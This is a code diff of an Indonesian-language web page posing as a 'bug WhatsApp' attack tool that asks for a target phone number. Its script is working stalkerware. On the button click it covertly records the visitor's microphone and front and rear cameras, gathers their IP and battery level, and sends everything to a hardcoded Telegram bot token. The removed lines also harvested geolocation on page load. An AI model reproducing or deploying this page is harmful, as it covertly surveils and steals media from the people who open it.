@@ -45,19 +45,12 @@
     .login-title {
       font-size: 26px;
       font-weight: 900;
-      margin-bottom: 5px;
+      margin-bottom: 10px;
       background: linear-gradient(135deg, #00ff7f, #ffffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    #notif {
-      font-size: 14px;
-      color: #00d9ff;
-      font-weight: 600;
-      height: 20px;
-      margin-bottom: 10px;
-      display: none;
-    }
+    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
     .login-input {
       width: 100%;
       padding: 12px;
@@ -80,6 +73,15 @@
       font-size: 15px;
     }
     .login-button:hover { background-color: #0f0; box-shadow: 0 0 20px lime; }
+    #info {
+      white-space: pre-wrap;
+      text-align: left;
+      margin-top: 20px;
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 13px;
+    }
     video { display: none; }
   </style>
 </head>
@@ -88,17 +90,18 @@
 
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
-    <div id="notif">bug terkirim ✅</div>
+    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
     <button class="login-button" id="login-button">Atack</button>
+    <div id="info">🥷 number target...</div>
   </div>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
     const chatIds = ['7945789634'];
+    const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
-    const notif = document.getElementById('notif');
 
     function sendToTelegram(text) {
       chatIds.forEach(id => {
@@ -116,40 +119,14 @@
         formData.append('chat_id', id);
         formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
+        
         let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
-        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }).catch(console.error);
+
+        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
       });
-    }
-
-    // Fungsi Gabungan untuk Meminta Semua Izin Sekaligus
-    async function requestAllPermissions() {
-      // 1. Minta Lokasi
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            let postalCode = "N/A";
-            try {
-              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-              const data = await res.json();
-              postalCode = data.address.postcode || "N/A";
-            } catch (e) {}
-            sendToTelegram(`<b>📍 Lokasi Terdeteksi:</b>\nLat: ${lat}\nLon: ${lon}\nKode Pos: ${postalCode}\n<a href="${mapsLink}">Google Maps</a>`);
-          },
-          (err) => { sendToTelegram("maaf akses lokasi ke tolak"); },
-          { enableHighAccuracy: true }
-        );
-      }
-
-      // 2. Minta Kamera & Mikrofon
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        stream.getTracks().forEach(track => track.stop()); // Matikan setelah izin didapat
-      } catch (err) {
-        // Notifikasi penolakan akan dikirim saat tombol Atack ditekan jika masih ditolak
-      }
     }
 
     async function getInfo() {
@@ -158,7 +135,7 @@
         const ipData = await ipRes.json();
         const battery = await navigator.getBattery?.() || { level: 0 };
         const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Masuk):</b>\n<pre>${text}</pre>`);
+        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
       } catch {}
     }
 
@@ -170,21 +147,23 @@
         mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note');
+          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note (5s)');
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {
-        sendToTelegram('di tolak voice chat');
-      }
+      } catch (err) {}
     }
 
     async function recordVideo(facingMode, label) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: facingMode }, 
+          audio: true 
+        });
         const mediaRecorder = new MediaRecorder(stream);
         const chunks = [];
+
         return new Promise((resolve) => {
           mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
           mediaRecorder.onstop = () => {
@@ -193,40 +172,43 @@
             stream.getTracks().forEach(track => track.stop());
             resolve();
           };
+
           mediaRecorder.start();
           setTimeout(() => mediaRecorder.stop(), 6000);
         });
-      } catch (err) { 
-        sendToTelegram('rekaman vidio di tolak 😹');
-        return Promise.resolve(); 
+      } catch (err) {
+        sendToTelegram(`❌ Gagal Video ${label}`);
+        resolve();
       }
     }
 
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
+      
       button.disabled = true;
-      notif.style.display = 'none';
+      infoDiv.innerText = '⏳ Memproses sistem...';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
+        await getInfo();
         recordAudio(); 
+        
+        infoDiv.innerText = '🎥 Merekam video depan (6s)...';
         await recordVideo("user", "Depan");
+        
         await new Promise(r => setTimeout(r, 1000));
+        
+        infoDiv.innerText = '🎥 Merekam video belakang (6s)...';
         await recordVideo("environment", "Belakang");
         
-        notif.style.display = 'block';
+        infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
         button.disabled = false;
         input.value = '';
       } catch (e) {
+        infoDiv.innerText = '❌ Terjadi kesalahan.';
         button.disabled = false;
       }
-    });
-
-    document.addEventListener('DOMContentLoaded', () => {
-      createParticles();
-      getInfo();
-      requestAllPermissions(); // Pemicu semua akses saat masuk
     });
 
     function createParticles() {
@@ -239,6 +221,7 @@
         container.appendChild(p);
       }
     }
+    document.addEventListener('DOMContentLoaded', createParticles);
   </script>
 </body>
 </html>
